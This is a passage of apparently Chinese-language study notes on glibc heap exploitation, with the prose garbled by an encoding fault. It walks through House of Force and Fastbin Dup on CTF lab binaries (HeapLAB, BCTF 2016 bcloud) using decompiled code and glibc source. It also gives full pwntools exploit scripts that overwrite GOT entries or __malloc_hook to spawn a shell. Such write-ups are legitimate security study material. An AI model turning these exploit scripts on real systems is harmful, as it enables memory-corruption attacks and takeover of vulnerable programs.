<p>æ–‡ä»¶è¯¦è§é™„ä»¶ <a href="attachment/house_of_force/house_of_force">house_of_force</a></p>
</blockquote>
<h5 id="ç›®æ ‡"><a href="#ç›®æ ‡" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h5><ul>
<li>ä¿®æ”¹targetçš„å€¼</li>
<li>è·å–shell</li>
</ul>
<h5 id="æ£€æŸ¥å®‰å…¨æªæ–½"><a href="#æ£€æŸ¥å®‰å…¨æªæ–½" class="headerlink" title="æ£€æŸ¥å®‰å…¨æªæ–½"></a>æ£€æŸ¥å®‰å…¨æªæ–½</h5><pre><code class="shell">â”Œâ”€â”€(fanyaã‰¿ferity)-[~/â€¦/heap/heaplab/part1/house_of_force]
â””â”€$ checksec house_of_force                                 
[*] &#39;/home/fanya/Desktop/heap/heaplab/part1/house_of_force/house_of_force&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  &#39;../.glibc/glibc_2.28_no-tcache&#39;
</code></pre>
<h5 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h5><p>ç¨‹åºåœ¨è¿è¡Œæ—¶å·²ç»™å‡ºlibcåœ°å€åŠheapåœ°å€ã€‚</p>
<p>åœ¨<code>read(0, m_array[index++], v5 + 8);</code>ä¸­æ˜æ˜¾çš„æº¢å‡º8ä¸ªå­—èŠ‚ã€‚</p>
<pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 num; // rax
  unsigned __int64 v4; // rax
  size_t v5; // rax
  unsigned int index; // [rsp+14h] [rbp-3Ch]
  char *m; // [rsp+18h] [rbp-38h]
  char *m_array[4]; // [rsp+20h] [rbp-30h] BYREF
  unsigned __int64 v9; // [rsp+48h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts(&quot;\n===============&quot;);
  puts(&quot;|   HeapLAB   |  House of Force&quot;);
  puts(&quot;===============\n&quot;);
  printf(&quot;puts() @ %p\n&quot;, &amp;puts);
  m = (char *)malloc(0x88uLL);
  printf(&quot;heap @ %p\n&quot;, m - 16);
  free(m);
  memset(m_array, 0, sizeof(m_array));
  index = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      printf(&quot;\n1) malloc %u/%u\n&quot;, index, 4LL);
      puts(&quot;2) target&quot;);
      puts(&quot;3) quit&quot;);
      printf(&quot;&gt; &quot;);
      num = read_num();
      if ( num != 2 )
        break;
      printf(&quot;\ntarget: %s\n&quot;, target);
    }
    if ( num == 3 )
      break;
    if ( num == 1 )
    {
      if ( index &gt; 3 )
      {
        puts(&quot;maximum requests reached&quot;);
      }
      else
      {
        printf(&quot;size: &quot;);
        v4 = read_num();
        m_array[index] = (char *)malloc(v4);
        if ( m_array[index] )
        {
          printf(&quot;data: &quot;);
          v5 = malloc_usable_size(m_array[index]);
          read(0, m_array[index++], v5 + 8);
        }
        else
        {
          puts(&quot;request failed&quot;);
        }
      }
    }
  }
  exit(0);
}
</code></pre>
<h5 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><ul>
<li>ç”±äºå †ä¸Šè¾“å…¥çš„æ—¶å€™æ°æœ‰8ä¸ªå­—èŠ‚çš„æº¢å‡ºï¼Œä¿®æ”¹top_chunkï¼Œä»è€Œè¾¾åˆ°ä»»æ„åœ°å€å†™ã€‚</li>
<li>ä¿®æ”¹__malloc_hook ä¸ºsystemçš„åœ°å€ã€‚</li>
</ul>
<h5 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><ul>
<li><p>ä½¿ç”¨8å­—èŠ‚æº¢å‡ºä¿®æ”¹top_chunkçš„sizeä¸º0xffffffffffffffff</p>
<pre><code class="python">malloc(24, b&quot;Y&quot;*24 + p64(0xffffffffffffffff)) 
</code></pre>
<p><img src="Heap.assets/image-20220816100317563.png" alt="image-20220816100317563"></p>
</li>
<li><p>è®¡ç®—ä¸ç›®æ ‡åœ°å€çš„åœ°å€</p>
<pre><code class="python"># Calculate the &quot;wraparound&quot; distance between two addresses.                                             
def delta(x, y):
    return (0xffffffffffffffff - x) + y 
distance = delta(heap + 0x20, elf.sym.target - 0x20)
# heap -&gt; heap addr 0x20 -&gt;first chunk size
distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
</code></pre>
</li>
<li><p>åˆ›å»ºchunkï¼Œè¾¾åˆ°ä»»æ„åœ°å€å†™</p>
<ul>
<li><p>modify_target</p>
<pre><code>~~~python
malloc(distance, b&quot;a&quot;)
malloc(24, b&#39;aaaaaaa&#39;)
</code></pre>
<p>  ~~~</p>
<p>  <img src="Heap.assets/image-20220816100752788.png" alt="image-20220816100752788"></p>
</li>
<li><p>drop shell</p>
<pre><code class="python">malloc(distance, b&quot;/bin/sh&quot;)
malloc(24, p64(libc.sym.system))
cmd = heap + 0x30
malloc(cmd, b&#39;&#39;)
</code></pre>
<p><img src="Heap.assets/image-20220816101120303.png" alt="image-20220816101120303"></p>
</li>
</ul>
</li>
</ul>
<h4 id="ç¤ºä¾‹äºŒï¼šBCTF-2016-bcloud"><a href="#ç¤ºä¾‹äºŒï¼šBCTF-2016-bcloud" class="headerlink" title="ç¤ºä¾‹äºŒï¼šBCTF 2016  bcloud"></a>ç¤ºä¾‹äºŒï¼šBCTF 2016  bcloud</h4><blockquote>
<p>æ–‡ä»¶è¯¦è§é™„ä»¶ <a href="attachment/bctf_2016_bcloud/bcloud">bcloud</a></p>
</blockquote>
<h5 id="æ£€æŸ¥å®‰å…¨æªæ–½-1"><a href="#æ£€æŸ¥å®‰å…¨æªæ–½-1" class="headerlink" title="æ£€æŸ¥å®‰å…¨æªæ–½"></a>æ£€æŸ¥å®‰å…¨æªæ–½</h5><p><img src="Heap.assets/image-20220814164430494.png" alt="image-20220814164430494"></p>
<h5 id="ç¨‹åºåˆ†æ-1"><a href="#ç¨‹åºåˆ†æ-1" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h5><ul>
<li><p>å°†ç¨‹åºæ‰“å®Œæ³¨é‡Šåä¸º<a href="attachment/bctf_2016_bcloud/bcloud.idb">bcloud.idb</a></p>
</li>
<li><p>åœ¨<code>my_input</code>å‡½æ•°ä¸­åœ¨æœ«å°¾ a2 çš„ä½ç½®åŠ å…¥ä¸€ä¸ª<code>\x00</code>, è€Œåœ¨name_initä¸­sæœ¬ä¸º64çš„å¤§å°ï¼Œ<code>my_input</code>ä¹Ÿæ˜¯64ï¼Œä½†ä¼šåœ¨65çš„ä½ç½®åŠ ä¸€ä¸ª<code>\x00</code>, ä½†æ˜¯ç”±äºåé¢çš„v2èµ‹å€¼çš„æ“ä½œï¼Œå°†<code>\x00</code>è¦†ç›–ä¸ºäº†åˆ«çš„å€¼ï¼Œè€Œä¸”ä¼šåœ¨åé¢çš„<code>some_output</code>æ³„éœ²å‡ºv2çš„å †åœ°å€ã€‚ç”±äºå­—ç¬¦ä¸²çš„ç»“æŸæ ‡å¿—ä¸º<code>\x00</code>ï¼Œæ‰€ä»¥<code>strcpy </code>å’Œ <code>puts</code> å‡½æ•°éƒ½ä¼šå¯¹è¿™ä¸ªv2çš„å †åœ°å€è¿›è¡Œæ“ä½œã€‚</p>
<pre><code class="c">int __cdecl my_input(int a1, int a2, char a3)
{
  char buf; // [esp+1Bh] [ebp-Dh] BYREF
  int i; // [esp+1Ch] [ebp-Ch]

  for ( i = 0; i &lt; a2; ++i )
  {
    if ( read(0, &amp;buf, 1u) &lt;= 0 )
      exit(-1);
    if ( buf == a3 )
      break;
    *(_BYTE *)(a1 + i) = buf;
  }
  *(_BYTE *)(i + a1) = 0;
  return i;
}
unsigned int name_init()
{
  char s[64]; // [esp+1Ch] [ebp-5Ch] BYREF
  char *v2; // [esp+5Ch] [ebp-1Ch]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(s, 0, 0x50u);
  puts(&quot;Input your name:&quot;);
  my_input((int)s, 64, &#39;\n&#39;);
  v2 = (char *)malloc(0x40u);
  name_chunk_0x40 = (int)v2;
  strcpy(v2, s);
  some_output(v2);                              // ä¿¡æ¯æ³„éœ²
  return __readgsdword(0x14u) ^ v3;
}
int __cdecl some_output(const char *a1)
{
  printf(&quot;Hey %s! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!\n&quot;, a1);
  return puts(&quot;Now let&#39;s set synchronization options.&quot;);
}
</code></pre>
</li>
<li><p>åœ¨åé¢çš„<code>org_host_init</code>å‡½æ•°ä¸­å¯¹äºorgåŠhostçš„åˆå§‹åŒ–ä¹Ÿåƒä¸Šè¿°ä¸€æ ·ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°<code>strcpy</code>åœ¨ç»™orgèµ‹å€¼çš„æ—¶å€™ä¼šå°†orgå­—ç¬¦ä¸²ã€orgè¿”å›åœ°å€ä»¥åŠhostå­—ç¬¦ä¸²å…¨éƒ¨èµ‹ç»™orgï¼Œä»è€Œé€ æˆå †æº¢å‡ºæ„é€ æˆ‘ä»¬ä½¿ç”¨<code>house of force</code>çš„æ¡ä»¶ã€‚</p>
<pre><code class="c">unsigned int org_host_init()
{
  char org_chunk_con[64]; // [esp+1Ch] [ebp-9Ch] BYREF
  char *org_chunk; // [esp+5Ch] [ebp-5Ch]
  char host_chunk_con[68]; // [esp+60h] [ebp-58h] BYREF
  char *host_chunk; // [esp+A4h] [ebp-14h]
  unsigned int v5; // [esp+ACh] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(org_chunk_con, 0, 0x90u);
  puts(&quot;Org:&quot;);
  my_input((int)org_chunk_con, 64, 10);
  puts(&quot;Host:&quot;);
  my_input((int)host_chunk_con, 64, 10);
  host_chunk = (char *)malloc(0x40u);
  org_chunk = (char *)malloc(0x40u);
  org_chunk_addr = (int)org_chunk;
  host_chunk_addr = (int)host_chunk;
  strcpy(host_chunk, host_chunk_con);
  strcpy(org_chunk, org_chunk_con);    // &lt;---
  puts(&quot;OKay! Enjoy:)&quot;);
  return __readgsdword(0x14u) ^ v5;
}
</code></pre>
</li>
<li><p>åœ¨åç»­çš„<code>new_note</code>ã€<code>show_note</code> ã€<code>edit_note</code>ã€ <code>del_note</code>ä¾¿ä¸ºå¸¸è§„æ“ä½œï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ç¨‹åºæœ€å¤šåˆ›å»º10ä¸ªnodeï¼Œå°†å…¶åœ°å€å’Œå¤§å°åˆ†åˆ«å‚¨å­˜åœ¨<code>node_list</code>å’Œ<code>node_size_list</code>ä¸­ï¼Œä»è€Œæ–¹ä¾¿æˆ‘ä»¬ä½¿ç”¨<code>edit_note</code>çš„æ—¶å€™ä¿®æ”¹æŸäº›å€¼ã€‚</p>
</li>
</ul>
<h5 id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h5><ul>
<li>æ³„æ¼ heap åœ°å€</li>
<li>åˆ©ç”¨æº¢å‡ºä¿®æ”¹ top chunk çš„ size</li>
<li>åˆ†é…ä¸€ä¸ª chunkï¼Œå°† top chunk è½¬ç§»åˆ° node_size_list æ•°ç»„å‰é¢</li>
<li>å†æ¬¡åˆ†é… chunkï¼Œå³å¯è¦†ç›– node_list ï¼Œå¹¶åˆ©ç”¨ Edit ä¿®æ”¹å…¶å†…å®¹</li>
<li>ä¿®æ”¹ <code>free@got.plt</code> ä¸º <code>puts@got.plt</code>ï¼Œæ³„æ¼ libc</li>
<li>ä¿®æ”¹ <code>atoi@got.plt</code> ä¸º <code>system@got.plt</code>ï¼Œå¾—åˆ° shell</li>
</ul>
<h5 id="æ¼æ´åˆ©ç”¨-1"><a href="#æ¼æ´åˆ©ç”¨-1" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><ul>
<li><p>ä½¿ç”¨nameçš„è¾“å…¥ -ã€‹ æ³„éœ²å †åœ°å€</p>
<pre><code class="python"># leak the heap addr
# dbg()
io.sendafter(&quot;name:\n&quot;, b&#39;A&#39;*0x40)
heap = u32(io.recvuntil(b&quot;! Welcome to BCTF&quot;, drop=True)[-4:])
log.info(f&quot;heap_addr -&gt; {hex(heap)}&quot;)
</code></pre>
<p><img src="Heap.assets/image-20220814182744179.png" alt="image-20220814182744179"></p>
</li>
<li><p>åˆ©ç”¨orgå’Œhostçš„è¾“å…¥ -ã€‹ ä¿®æ”¹top chunkçš„sizeä¸º-1</p>
<pre><code class="python"># overflow
io.sendafter(&quot;Org:\n&quot;, &quot;A&quot; * 0x40)
io.sendlineafter(&quot;Host:\n&quot;, p32(0xffffffff))
# dbg()
</code></pre>
<p><img src="Heap.assets/image-20220814194641198.png" alt="image-20220814194641198"></p>
</li>
<li><p>è®¡ç®—hack_chunk çš„å¤§å° å°†top_chunkç§»åŠ¨è‡³bssæ®µ</p>
<p>0x804b0a0 -&gt; note_size_list</p>
<pre><code class="python">new((0x804b0a0 - 0x10) - (heap + 0xd0), b&#39;AAAA&#39;)
</code></pre>
</li>
<li><p>æ–°å»ºä¸€ä¸ªchunk è¦†ç›–note_list æ•°ç»„ï¼Œå¹¶ä¿®æ”¹å…¶å†…å®¹</p>
<pre><code class="python">payload = b&#39;A&#39;*0x80
payload += p32(elf.got.free) # note[0]
payload += p32(elf.got.atoi) * 2 # note[1] note[2]
new(0x8c, payload)
# dbg()
</code></pre>
<p><img src="Heap.assets/image-20220814212052885.png" alt="image-20220814212052885"></p>
</li>
<li><p>ä¿®æ”¹free_got ä¸º puts_got æ³„éœ²libcåœ°å€</p>
<pre><code class="python"># free@got.plt -&gt; puts@plt
edit(0, p32(elf.plt.puts))
dele(1)
atoi_addr = u32(io.recvn(4))
io.recv()
libc.address = atoi_addr - libc.sym.atoi
log.info(f&quot;libc addr -&gt; {hex(libc.address)}&quot;)
</code></pre>
<p><img src="Heap.assets/image-20220814212638115.png" alt="image-20220814212638115"></p>
</li>
<li><p>ä¿®æ”¹ atoi_got ä¸º system_gotï¼Œ è·å¾—shell</p>
<pre><code class="python">system_addr = libc.sym.system
log.info(f&quot;system addr -&gt; {hex(libc.sym.system)}&quot;)
# dbg()
io.sendline(&#39;\n&#39;)
edit(2, p32(system_addr))
io.sendlineafter(b&#39;option---&gt;&gt;\n&#39;, b&#39;/bin/sh\x00&#39;)
io.interactive()
</code></pre>
<p><img src="Heap.assets/image-20220814214814810.png" alt="image-20220814214814810"></p>
</li>
</ul>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">#!/usr/bin/python3

from pwn import *
elf = context.binary = ELF(&#39;./bcloud&#39;)
libc = elf.libc
context.log_level = &#39;debug&#39;
gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

io = start()
def new(length, context):
    io.sendlineafter(&quot;option---&gt;&gt;\n&quot;, b&#39;1&#39;)
    io.sendlineafter(&quot;note content:\n&quot;, str(length))
    io.sendlineafter(&quot;content:\n&quot;, context)
def edit(idx, context):
    io.sendlineafter(&quot;option---&gt;&gt;\n&quot;, b&#39;3&#39;)
    io.sendline(str(idx))
    io.sendlineafter(&quot;content:\n&quot;, context)
def dele(idx):
    io.sendlineafter(&quot;option---&gt;&gt;\n&quot;, b&#39;4&#39;)
    io.sendlineafter(&quot;id:\n&quot;, str(idx))
def dbg():
    gdb.attach(io)
    pause()
# leak the heap addr
# dbg()
io.sendafter(&quot;name:\n&quot;, b&#39;A&#39;*0x40)
heap = u32(io.recvuntil(b&quot;! Welcome to BCTF&quot;, drop=True)[-4:])
log.info(f&quot;heap_addr -&gt; {hex(heap)}&quot;)

# overflow
io.sendafter(&quot;Org:\n&quot;, &quot;A&quot; * 0x40)
io.sendlineafter(&quot;Host:\n&quot;, p32(0xffffffff))
# dbg()

new((0x804b0a0 - 0x10) - (heap + 0xd0), b&#39;AAAA&#39;)
# new((0xffffffff - (heap + 0xd0) + (0x804b0a0 - 0x10)), b&#39;aaaa&#39;)
# dbg()
# new(0x40, b&quot;a&quot;*0x40)
payload = b&#39;A&#39;*0x80
payload += p32(elf.got.free) # note[0]
payload += p32(elf.got.atoi) * 2 # note[1] note[2]
new(0x8c, payload)
# dbg()
# free@got.plt -&gt; puts@plt
edit(0, p32(elf.plt.puts))
dele(1)
atoi_addr = u32(io.recvn(4))
io.recv()
libc.address = atoi_addr - libc.sym.atoi
log.info(f&quot;libc addr -&gt; {hex(libc.address)}&quot;)

system_addr = libc.sym.system
log.info(f&quot;system addr -&gt; {hex(libc.sym.system)}&quot;)
# dbg()
io.sendline(&#39;\n&#39;)
edit(2, p32(system_addr))

io.sendlineafter(b&#39;option---&gt;&gt;\n&#39;, b&#39;/bin/sh\x00&#39;)

io.interactive()
</code></pre>
<h3 id="Fastbin-Dub"><a href="#Fastbin-Dub" class="headerlink" title="Fastbin Dub"></a>Fastbin Dub</h3><h4 id="æ¦‚è¿°-1"><a href="#æ¦‚è¿°-1" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h4><p>åˆ©ç”¨double-freeé”™è¯¯ï¼Œå¼ºåˆ¶mallocè¿”å›ä¸€ä¸ªchunkä¸¤æ¬¡ï¼Œä¸­é—´ä¸é‡Šæ”¾å®ƒã€‚è¿™ç§æŠ€æœ¯é€šå¸¸æ˜¯é€šè¿‡ç ´åfastbinå…ƒæ•°æ®ï¼Œå°†ä¸€ä¸ªå‡çš„å—é“¾æ¥åˆ°fastbinä¸­æ¥åˆ©ç”¨çš„ã€‚è¿™ä¸ªå‡å—å¯ä»¥è¢«åˆ†é…ï¼Œç„¶åç¨‹åºåŠŸèƒ½å¯ä»¥è¢«ç”¨æ¥è¯»å–æˆ–å†™å…¥ä¸€ä¸ªä»»æ„çš„å†…å­˜ä½ç½®ã€‚</p>
<h4 id="è¯¦æƒ…-1"><a href="#è¯¦æƒ…-1" class="headerlink" title="è¯¦æƒ…"></a>è¯¦æƒ…</h4><p>fastbinä¸­double freeæ£€æŸ¥åªç¡®ä¿è¢«é‡Šæ”¾åˆ°fastbinä¸­çš„å—ä¸æ˜¯è¯¥binä¸­çš„ç¬¬ä¸€ä¸ªå—(é“¾è¡¨å¤´éƒ¨çš„å—ã€åˆšåˆšé‡Šæ”¾çš„å—)ï¼Œå¦‚æœåœ¨ä¸¤ä¸ªbinä¹‹é—´é‡Šæ”¾äº†ä¸€ä¸ªç›¸åŒå¤§å°çš„ä¸åŒå—ï¼Œåˆ™æ£€æŸ¥é€šè¿‡ã€‚</p>
<ul>
<li><p>æ­£å¸¸æƒ…å†µ:</p>
<p><img src="Heap.assets/image-20220820160146712.png" alt="image-20220820160146712"></p>
</li>
<li><p>double free:</p>
<p><img src="Heap.assets/image-20220820161049541.png" alt="image-20220820161049541"></p>
<pre><code class="c">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */
        mchunkptr old = *fb, old2;
        unsigned int old_idx = ~0u;
        do {
            /* Check that the top of the bin is not the record we are going to add
               (i.e., double free).  */
            if (__builtin_expect(old == p, 0)) {
                errstr = &quot;double free or corruption (fasttop)&quot;;
                goto errout;
            }
            /* Check that size of fastbin chunk at the top is the same as
               size of the chunk that we are adding.  We can dereference OLD
               only if we have the lock, otherwise it might have already been
               deallocated.  See use of OLD_IDX below for the actual check.  */
            if (have_lock &amp;&amp; old != NULL)
                old_idx = fastbin_index(chunksize(old));
            p-&gt;fd = old2 = old;
        } while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);

        if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect(old_idx != idx, 0)) {
            errstr = &quot;invalid fastbin entry (free)&quot;;
            goto errout;
        }
</code></pre>
</li>
<li><p>ç»•è¿‡ double free:</p>
<p><img src="Heap.assets/image-20220820162024274.png" alt="image-20220820162024274"></p>
</li>
</ul>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œåœ¨é‡Šæ”¾æ—¶è¿˜ä¼šæ£€æŸ¥å½“å‰å—çš„sizeåŸŸä¸å¤´éƒ¨åŸŸæ˜¯å¦ç›¸ç­‰ï¼Œç”±äºæˆ‘ä»¬é‡Šæ”¾çš„æ˜¯åŒä¸€ä¸ªå—ï¼Œä¹Ÿå°±ä¸å­˜åœ¨è¯¥é—®é¢˜ã€‚</p>
<h4 id="å¦‚ä½•åˆ©ç”¨fastbin-dup"><a href="#å¦‚ä½•åˆ©ç”¨fastbin-dup" class="headerlink" title="å¦‚ä½•åˆ©ç”¨fastbin dup"></a>å¦‚ä½•åˆ©ç”¨fastbin dup</h4><p>å°†ä¸€ä¸ªå—äºŒæ¬¡é‡Šæ”¾åï¼Œæˆ‘ä»¬ç»§ç»­mallocä¸€ä¸ªç›¸åŒå¤§å°çš„å—ï¼Œæ­¤æ—¶mallocå°†ä»fastbinä¸­åˆ›å»ºå—ï¼Œè€Œä¸æ˜¯åœ¨top chunkä¸­åˆ›å»ºã€‚æ­¤æ—¶æˆ‘ä»¬å¾€è¿™ä¸ªå—ä¸­å¡«å†™æ•°æ®å°±æ„å‘³ç€æˆ‘ä»¬æ­£åœ¨ä¿®æ”¹è¿™ä¸ªå—çš„fdæŒ‡é’ˆï¼Œå°†å…¶ä¿®æ”¹ä¸ºä¸€ä¸ªæˆ‘ä»¬æƒ³è¦çš„å€¼å³å¯ã€‚</p>
<p><img src="Heap.assets/image-20220820164643151.png" alt="image-20220820164643151"></p>
<p>ä½†æ˜¯æ­¤è¿‡ç¨‹ä¸­ä¹Ÿå­˜åœ¨ç€ä¸€ä¸ªå¯¹sizeåŸŸçš„æ£€æŸ¥æªæ–½ï¼Œå› æ­¤æˆ‘ä»¬å¸¸å¸¸ä½¿ç”¨__malloc_hookå‰35å­—èŠ‚æ‰€å‡ºç°çš„ä¸€ä¸ª0x7fçš„å¤§å°å­—æ®µï¼Œç„¶åå°†__malloc_hookä¿®æ”¹ä¸ºone_gadgetã€‚æ‰€éœ€è¦æ³¨æ„çš„æ˜¯å‡å°ºå¯¸å­—æ®µä¸­ä¸å…¼å®¹çš„æ ‡å¿—ï¼Œä¸€ä¸ªè®¾ç½®çš„NON_MAIN_ARENAæ ‡å¿—å’Œä¸€ä¸ªæ¸…é™¤çš„ CHUNK_IS_MMAPPEDæ ‡å¿—ä¼šå¯¼è‡´ä¸€ä¸ªsegfaultã€‚èƒ½å¤Ÿè¿™æ ·åšçš„åŸå› æ˜¯ï¼Œåˆ†é…æ—¢ä¸å—å¯¹é½æ£€æŸ¥ï¼Œä¹Ÿä¸å—æ ‡å¿—æŸåæ£€æŸ¥</p>
<p><img src="Heap.assets/image-20220820181022737.png" alt="image-20220820181022737"></p>
<pre><code class="c">    /*
       If the size qualifies as a fastbin, first check corresponding bin.
       This code is safe to execute even if av is not yet initialized, so we
       can try it without checking, which saves some time on this fast path.
     */

    if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) {
        idx = fastbin_index (nb);
        mfastbinptr *fb = &amp;fastbin (av, idx);
        mchunkptr pp = *fb;
        do {
            victim = pp;
            if (victim == NULL)
                break;
        } while ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim))
                 != victim);
        if (victim != 0) {
            if (__builtin_expect(fastbin_index (chunksize(victim)) != idx, 0)) {
                errstr = &quot;malloc(): memory corruption (fast)&quot;;
                errout:
                malloc_printerr(check_action, errstr, chunk2mem (victim), av);
                return NULL;
            }
            check_remalloced_chunk (av, victim, nb);
            void *p = chunk2mem (victim);
            alloc_perturb(p, bytes);
            return p;
        }
    }
</code></pre>
<h4 id="ç¤ºä¾‹ä¸€ï¼šfastbin-dup"><a href="#ç¤ºä¾‹ä¸€ï¼šfastbin-dup" class="headerlink" title="ç¤ºä¾‹ä¸€ï¼šfastbin_dup"></a>ç¤ºä¾‹ä¸€ï¼šfastbin_dup</h4><blockquote>
<p>æ–‡ä»¶è¯¦è§é™„ä»¶ <a href="attachment/fastbin_dup/fastbin_dup">fastbin_dup</a></p>
</blockquote>
<h5 id="ç›®æ ‡-1"><a href="#ç›®æ ‡-1" class="headerlink" title="ç›®æ ‡"></a>ç›®æ ‡</h5><ul>
<li>ä¿®æ”¹targetçš„å€¼</li>
<li>è·å–shell</li>
</ul>
<h5 id="æ£€æŸ¥å®‰å…¨æªæ–½-2"><a href="#æ£€æŸ¥å®‰å…¨æªæ–½-2" class="headerlink" title="æ£€æŸ¥å®‰å…¨æªæ–½"></a>æ£€æŸ¥å®‰å…¨æªæ–½</h5><pre><code class="sh">â”Œâ”€â”€(fanyaã‰¿ferity)-[~/â€¦/heap/heaplab/part1/fastbin_dup]
â””â”€$ checksec fastbin_dup   
[*] &#39;/home/fanya/Desktop/heap/heaplab/part1/fastbin_dup/fastbin_dup&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  &#39;../.glibc/glibc_2.30_no-tcache&#39;
</code></pre>
<h5 id="ç¨‹åºåˆ†æ-2"><a href="#ç¨‹åºåˆ†æ-2" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h5><p>åœ¨ç¨‹åºè¿è¡Œæ—¶ç»™å‡ºäº†libcçš„åœ°å€ï¼Œå¹¶æœªé˜»æ­¢double freeçš„æ“ä½œã€‚</p>
<pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 num; // rax
  unsigned int index; // [rsp+14h] [rbp-4Ch]
  size_t n; // [rsp+18h] [rbp-48h]
  unsigned __int64 na; // [rsp+18h] [rbp-48h]
  char *m_array[7]; // [rsp+20h] [rbp-40h] BYREF
  unsigned __int64 v8; // [rsp+58h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts(&quot;\n===============&quot;);
  puts(&quot;|   HeapLAB   |  Fastbin Dup&quot;);
  puts(&quot;===============\n&quot;);
  printf(&quot;puts() @ %p\n&quot;, &amp;puts);
  memset(m_array, 0, sizeof(m_array));
  index = 0;
  printf(&quot;\nEnter your username: &quot;);
  read(0, &amp;user_0, 0x10uLL);
  while ( 1 )
  {
    while ( 1 )
    {
      printf(&quot;\n1) malloc %u/%u\n&quot;, index, 7LL);
      puts(&quot;2) free&quot;);
      puts(&quot;3) target&quot;);
      puts(&quot;4) quit&quot;);
      printf(&quot;&gt; &quot;);
      num = read_num();
      if ( num != 2 )
        break;
      printf(&quot;index: &quot;);
      na = read_num();
      if ( na &gt;= index )
        puts(&quot;invalid index&quot;);
      else
        free(m_array[na]);
    }
    if ( num &gt; 2 )
    {
      if ( num == 3 )
      {
        printf(&quot;\ntarget: %s\n&quot;, user_0.target);
      }
      else if ( num == 4 )
      {
        exit(0);
      }
    }
    else if ( num == 1 )
    {
      if ( index &gt; 6 )
      {
        puts(&quot;maximum requests reached&quot;);
      }
      else
      {
        printf(&quot;size: &quot;);
        n = read_num();
        if ( n &gt; 0x78 )
        {
          puts(&quot;fast chunks only (120 bytes maximum)&quot;);
        }
        else
        {
          m_array[index] = (char *)malloc(n);
          if ( m_array[index] )
          {
            printf(&quot;data: &quot;);
            read(0, m_array[index++], n);
          }
          else
          {
            puts(&quot;request failed&quot;);
          }
        }
      }
    }
  }
}
pwndbg&gt; ptype user
type = struct user {
    char username[16];
    char target[16];
}
00000000 user struc ; (sizeof=0x20, copyof_13)   ; XREF: .data:user_0/r
00000000 username db 16 dup(?)
00000010 target db 16 dup(?)
00000020 user ends
00000020
</code></pre>
<h5 id="æ€è·¯åˆ†æ-ã€‹modify"><a href="#æ€è·¯åˆ†æ-ã€‹modify" class="headerlink" title="æ€è·¯åˆ†æ-ã€‹modify"></a>æ€è·¯åˆ†æ-ã€‹modify</h5><ul>
<li>è§‚å¯Ÿåˆ°targetåœ¨userç»“æ„ä½“çš„ä¸­çš„targetï¼Œä¸”è¯¥ç»“æ„ä½“çš„å¤§å°ä¸º0x20ï¼Œä½¿ç”¨å¼€å§‹çš„usernameçš„è¾“å…¥æ„é€ ä¸€ä¸ªè™šå‡çš„sizeå­—æ®µã€‚</li>
<li>è¿›è¡Œfastbin dupï¼Œå°†fdæ”¹ä¸ºuserç»“æ„ä½“çš„ä½ç½®ã€‚</li>
<li>ä¿®æ”¹target</li>
</ul>
<h5 id="æ¼æ´åˆ©ç”¨-ã€‹modify"><a href="#æ¼æ´åˆ©ç”¨-ã€‹modify" class="headerlink" title="æ¼æ´åˆ©ç”¨-ã€‹modify"></a>æ¼æ´åˆ©ç”¨-ã€‹modify</h5><ul>
<li><p>fastbin dup </p>
<pre><code class="python"># Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)
</code></pre>
<p><img src="Heap.assets/image-20220820173211603.png" alt="image-20220820173211603"></p>
</li>
<li><p>ä¿®æ”¹fdæŒ‡é’ˆ</p>
<pre><code class="python"># modify fd
chunk_1 = malloc(0x28, p64(elf.sym.user))
</code></pre>
<p><img src="Heap.assets/image-20220820173412011.png" alt="image-20220820173412011"></p>
</li>
<li><p>malloc twice</p>
<pre><code class="python"># malloc_twice
malloc(0x28, b&quot;1&quot;)
malloc(0x28, b&quot;2&quot;)
</code></pre>
